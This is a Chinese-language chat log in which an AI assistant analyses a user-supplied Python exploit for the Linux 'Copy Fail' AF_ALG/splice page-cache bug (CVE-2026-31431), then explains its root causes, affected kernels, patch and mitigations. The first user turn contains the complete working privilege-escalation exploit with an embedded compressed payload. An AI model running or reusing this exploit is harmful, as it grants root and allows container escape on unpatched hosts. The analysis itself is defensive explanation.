# AF_ALG提权漏洞分析

### 🧑‍💻 User

```
#!/usr/bin/env python3
import os as g,zlib,socket as s
def d(x):return bytes.fromhex(x)
def c(f,t,c):
 a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));h=279;v=a.setsockopt;v(h,1,d('0800010000000010'+'0'*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d('00');u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3),],32768);r,w=g.pipe();n=g.splice;n(f,w,o,offset_src=0);n(r,u.fileno(),o)
 try:u.recv(8+t)
 except:0
f=g.open("/usr/bin/su",0);i=0;e=zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))
while i<len(e):c(f,i,e[i:i+4]);i+=4
g.system("su")
```
这段代码有什么用途？

---

### 🤖 Assistant

## TL;DR

这是一段 **Linux 本地提权（LPE）漏洞利用代码**。它利用内核 `AF_ALG`（内核加密 API 套接字）配合 `splice()` 的**页缓存写穿透（page-cache write）缺陷**，绕过只读权限，把一段恶意 ELF 覆盖进 setuid-root 文件 `/usr/bin/su` 的**内存中的页缓存**，然后执行 `su` 从而获得 **root 权限**。

本质上是和 **Dirty COW（CVE-2016-5195）同类**的"篡改只读文件、劫持 setuid 程序"的攻击思路，只是入口换成了内核 crypto 子系统。

---

## 代码结构解析

```python
import os as g, zlib, socket as s
```

### 1. 核心函数 `c(f, t, c)` —— 往文件偏移 `t` 写 4 字节

```python
a = s.socket(38, 5, 0)                       # AF_ALG(38), SOCK_SEQPACKET(5)
a.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))   # 绑定 AEAD 算法
h = 279                                      # SOL_ALG
v = a.setsockopt
v(h, 1, d('0800010000000010'+'0'*64))        # ALG_SET_KEY，设置密钥(72字节)
v(h, 5, None, 4)                             # ALG_SET_AEAD_AUTHSIZE
u, _ = a.accept()                            # 拿到一个操作套接字
```

这里的算法是 RFC 4303 的 **ESN（扩展序列号）** 模式的 `authencesn(hmac(sha256), cbc(aes))`——旧内核上它是著名的漏洞算法。

```python
o = t + 4
u.sendmsg(
    [b"A"*4 + c],                            # 明文输入：4字节填充 + 我们要写的4字节
    [(h, 3, d('00')*4),                      # ALG_SET_OP     = 加/解密方向
     (h, 2, b'\x10' + d('00')*19),           # ALG_SET_IV     = 16字节 IV
     (h, 4, b'\x08' + d('00')*3)],           # ALG_SET_AEAD_ASSOCLEN = 8
    32768)
r, w = g.pipe()
n = g.splice
n(f, w, o, offset_src=0)                     # ① 从目标文件 splice 到管道
n(r, u.fileno(), o)                          # ② 从管道 splice 到 AF_ALG 套接字
try: u.recv(8+t)                             # 触发并丢弃 AEAD 输出
except: 0
```

**关键点**：`splice` 是**零拷贝**的。文件内容被 `splice` 进管道时，管道里放的是该文件 **页缓存（page cache）页的引用**；再把管道 `splice` 进 `AF_ALG` 套接字时，内核 crypto 层会把运算结果**原地写回这些页**——而这些页正是 `/usr/bin/su` 的页缓存。于是攻击者在**没有写权限**的情况下改掉了只读文件的内存内容。

> 精妙之处在于：只写"目标偏移前 `t+4` 字节"还不够，攻击者把 `authencesn` 的加解密方向、IV、AAD 长度精心构造，使运算的**输出恰好等于期望字节**，从而实现对任意字节的"写入"。

### 2. 主流程 —— 覆盖 `/usr/bin/su` 并执行

```python
f = g.open("/usr/bin/su", 0)                 # 以只读(0=O_RDONLY)打开，无法正常写
e = zlib.decompress(d("78da...."))           # 解压 zlib 载荷(78da 是 zlib 头)
i = 0
while i < len(e):
    c(f, i, e[i:i+4])                        # 每 4 字节逐块覆盖目标文件
    i += 4
g.system("su")                               # 执行被篡改的 setuid-root 程序 → root
```

- `78da...` 是一段 **zlib 压缩的 ELF 载荷**（大概率是能弹 root shell 或做后续操作的二进制）。
- 它从偏移 `0` 开始覆盖，会把 `/usr/bin/su` 的 **ELF 头都改掉**，也就是**整体替换**为恶意 ELF。
- 文件权限位（setuid root）没有被修改，所以执行时**仍以 root 身份运行**。

---

## 攻击原理总结

| 步骤 | 作用 |
|------|------|
| `socket(AF_ALG, SOCK_SEQPACKET)` + `bind(aead, authencesn...)` | 打开内核加密接口 |
| `splice(file → pipe → alg socket)` | 让加密运算的输出**原地写回文件的页缓存页** |
| 精心构造 IV/方向/AAD | 使输出字节 = 攻击者期望的字节（任意写） |
| 逐 4 字节覆盖 `/usr/bin/su` | 用只读 fd 绕过写权限检查，篡改内存态文件 |
| `system("su")` | 借 setuid-root 执行被篡改的二进制 → 提权 |

核心缺陷：内核 crypto 的收发路径中，目标缓冲区与 `splice` 传入的**页缓存页发生了别名（aliasing）**，导致"只读文件"的页缓存被写入。

---

## 用途与提醒

- **用途**：在**存在该漏洞的旧版 Linux 内核**上，从普通用户提权到 **root**，属于典型的可利用 exploit（也可被用作后门/病毒的一环）。
- **合规警告**：这类代码**仅可用于授权的安全研究、CTF 或隔离环境中分析**。在未获授权的系统上运行或传播，属于违法行为，可能承担法律责任。
- 若你在真实系统上看到它，说明该主机**可能已被入侵**，应立刻排查。
- **防御**：及时更新内核（该 `AF_ALG`/`splice` 漏洞及 `authencesn` 相关问题早已修复）、启用 `SELinux`/`AppArmor`、限制 setuid 二进制数量、使用只读根文件系统等。

如果你希望，我可以帮你进一步：
- 把这段代码**逐行注释**成更易读的伪代码；
- 尝试**还原/分析**那个 zlib 压缩的载荷结构（需谨慎、在沙箱内进行）。

---

### 🧑‍💻 User

再联网查询下这个脚本利用了哪些bug实现提权的？

---

### 🤖 Assistant

我来查一下相关的漏洞信息。先看看有哪些可用的搜索工具。

有浏览器和抓取工具。我来搜索相关漏洞信息。

搜索结果一致指向 **CVE-2026-31431（代号 "Copy Fail"）**。我再抓取几篇技术分析确认细节。

已确认。我再抓取官方披露来源核对细节（补丁、影响范围）。

已从官方来源（Xint/Theori、cold-reboot、Andrea Fortuna 等）确认。先关闭浏览器窗口释放资源：

# 联网查询结果：这段脚本利用的是什么漏洞

## 结论

这段脚本是 **CVE-2026-31431**（代号 **"Copy Fail"**）的公开 PoC，一个 **Linux 内核本地提权（LPE）漏洞**。

- **披露方**：韩国安全公司 **Theori / Xint Code** 研究团队（Taeyang Lee 等），2026-04-29 公开
- **官方文章**：<https://xint.io/blog/copy-fail-linux-distributions>（专题站 copy.fail）
- **PoC 仓库**：`theori-io/copy-fail-CVE-2026-31431`
- **性质**：无竞争、可移植、约 732 字节 Python 脚本，就能在 Ubuntu / Amazon Linux / RHEL / SUSE 等主发行版上拿到 root

它不是单一 bug，而是**三个历史改动"恰好叠加"成的一个漏洞**。下面按"根因 + 触发点 + 串联点"拆开讲。

---

## 漏洞由哪些 bug 组合而成

### ① 根因：2017 年 `algif_aead` 的 "in-place 优化"（最重要的 bug）

提交 **`72548b093ee3`**（2017）把 AEAD 操作从"分离输入/输出"改成**原地（in-place）**处理：

```text
输入 scatterlist:  AAD  ||  密文  ||  Tag
                    │拷贝     │拷贝   ↑ 未拷贝，sg_chain() 按引用挂接
                    ▼         ▼       │
输出 scatterlist:  AAD  ||  密文  ────┘   ← Tag 仍指向文件的 page cache 页
随后: req->src = req->dst   (src/dst 指向同一条链)
```

- `AAD` 和密文是**真正 memcpy 复制**的；**唯独最后 `authsize` 字节的认证 Tag 没有复制**，而是用 `sg_chain()` **按引用**接进输出 scatterlist——这就是 **"Copy Fail"（拷贝失败）** 名字的来源。
- 结果：**文件的 page cache 页被放进了可写的目的 scatterlist**，与合法写区之间只隔一个偏移量。内核 API 默认"每个 AEAD 算法都会乖乖只写自己的输出区"，但这个假设没人强制、也没文档化。

### ② 触发点：`authencesn` 的 "scratch write"（越界写 4 字节）

算法 `authencesn(hmac(sha256),cbc(aes))` 是 IPsec ESN（RFC 4303）用的模板。它的解密函数 `crypto_authenc_esn_decrypt()` 把**调用者的目标缓冲区当草稿纸**：

```c
scatterwalk_map_and_copy(tmp, dst, 0, 8, 0);                        // 读 AAD 0~7
scatterwalk_map_and_copy(tmp, dst, 4, 4, 1);                        // 临时把 seqno_hi 写回 dst[4..7]
scatterwalk_map_and_copy(tmp + 1, dst, assoclen + cryptlen, 4, 1);  // 把 seqno_lo 写到 tag 之后！
```

- 最后一行在 **`assoclen + cryptlen`** 处写 4 字节，**越过了合法的 AEAD 输出/tag 边界**，而且**永不复原**（`..._decrypt_tail()` 读回 `seqno_lo` 后不还原）。
- 这 4 字节的值 = **AAD 的第 4~7 字节（`seqno_lo`），完全由攻击者控制**。
- 内核里 **GCM / CCM / 普通 authenc 都不会越界**，只有 `authencesn` 会。
- 引入时间：提交 `a5079d084f8b`（2011）；提交 `104880a6b470`（2015 改到新 AEAD 接口）使其变成 `assoclen + cryptlen` 偏移。

### ③ 串联点：`splice()` 的零拷贝把 page cache 送进来

`splice()` 在文件描述符/管道间**按引用传递 page cache 页**，不做拷贝：

```python
splice(file_fd → pipe)      # 管道里是文件页缓存页的引用
splice(pipe → algo_socket)  # 直接送进内核 crypto 的输入 scatterlist
```

- 此时 socket 输入 scatterlist **直接引用**该文件的物理页（所有 `read()`/`mmap()`/`execve()` 用的都是同一批页）。
- 结合 ① 的 in-place 设计，这些页落进了**可写目的 scatterlist**；再结合 ② 的 4 字节越界写，就得到**对任意可读文件的 page cache 进行"确定性的 4 字节写"**。

> 三个改动单独看都"合理"，交汇处就成了可静默利用近 10 年的漏洞。

---

## 与脚本代码的对应关系

| 脚本片段 | 作用（对应上面的 bug） |
|---|---|
| `socket(38, 5, 0)` | `AF_ALG` + `SOCK_SEQPACKET`（漏洞入口） |
| `bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))` | 选中会越界写的 ② 号算法 |
| `sendmsg` 中 AAD = `b"A"*4 + c` | 第 4~7 字节就是**要写入的 4 字节值（`seqno_lo`）** |
| `splice(f, w, o, offset_src=0)` / `splice(r, u.fileno(), o)` | ③ 号零拷贝，把 `/usr/bin/su` 的 page cache 页送进 crypto |
| `u.recv(8+t)` | 触发解密 → ② 号 4 字节越界写落到 ① 号暴露出的 page cache 页上 |
| `open("/usr/bin/su", 0)` 只读打开 | 绕过 VFS 权限检查（不经过写路径） |
| `zlib.decompress(d("78da..."))` | 解压出要注入的 ELF/shellcode 载荷 |
| 每 4 字节循环 `c(f, i, e[i:i+4])` | 反复触发基元，逐 4 字节改写 setuid 二进制 |
| `system("su")` | 执行被改写的 setuid-root 程序 → root |

---

## 影响范围与修复（来自官方分析）

- **受影响**：约内核 **4.14 ~ 7.0-rc**（2017 年底至今），含 LTS 后向移植分支 `6.12.x / 6.6.x / 5.15.x / 5.10.x`。已实测：Ubuntu 24.04、Amazon Linux 2023、RHEL 10.1、SUSE 16。
- **修复补丁**：提交 **`a664bf3d603d`** —— 把 `algif_aead` 改回 out-of-place（`req->src` 指向 TX SGL、`req->dst` 指向 RX SGL），删除 `sg_chain` 引入路径。进入内核 **6.19.12 / 6.18.22 / 7.0** 等。
- **临时缓解**：用 seccomp 拦截 `AF_ALG` 套接字创建，或禁用模块 `algif_aead`：
  ```bash
  echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif-aead.conf
  rmmod algif_aead 2>/dev/null
  ```

<details>
<summary><b>为什么它很危险 / 为什么难被发现（点击展开）</b></summary>

- **无竞争、不崩溃**：不像 Dirty Cow（CVE-2016-5195）要抢竞态、Dirty Pipe（CVE-2022-0847）有版本限制，Copy Fail 是直线型逻辑缺陷，稳定可靠。
- **不落盘、无痕迹**：只污染内存 page cache，内核不会把页标脏、不触发回写；**磁盘上的文件始终未变**，基于磁盘哈希的文件完整性校验（FIM）完全看不到。
- **跨容器逃逸**：page cache 在主机与容器间共享，容器内非特权用户也能借它篡改主机上 setuid 二进制 → 逃逸出容器、攻陷 K8s 节点。
- **检测思路**：监控非磁盘加密工具创建 `AF_ALG SEQPACKET` 套接字（Sysdig 已发布 Falco 规则、ReversingLabs 发布 YARA 规则）。

</details>

---

## 参考来源

- 官方披露（Theori/Xint）：<https://xint.io/blog/copy-fail-linux-distributions>
- 专题站：copy.fail；PoC：`github.com/theori-io/copy-fail-CVE-2026-31431`
- 技术分析：cold-reboot.dev《CVE-2026-31431 Copy Fail》、razz.systems、andreafortuna.org
- 关键提交：引入 `72548b093ee3` / 修复 `a664bf3d603d`；`authencesn` 历史 `a5079d084f8b`、`104880a6b470`

> ⚠️ 提醒：这是可用的提权 exploit。仅限**授权的安全研究/CTF/隔离环境**分析；在未授权系统上运行或传播属违法行为。若在真实主机上发现该脚本，说明主机很可能**已被入侵**，应立即隔离排查。

需要的话，我可以继续帮你**在沙箱里还原那个 zlib 载荷的内容**，或**整理一份针对该漏洞的检测/加固清单**。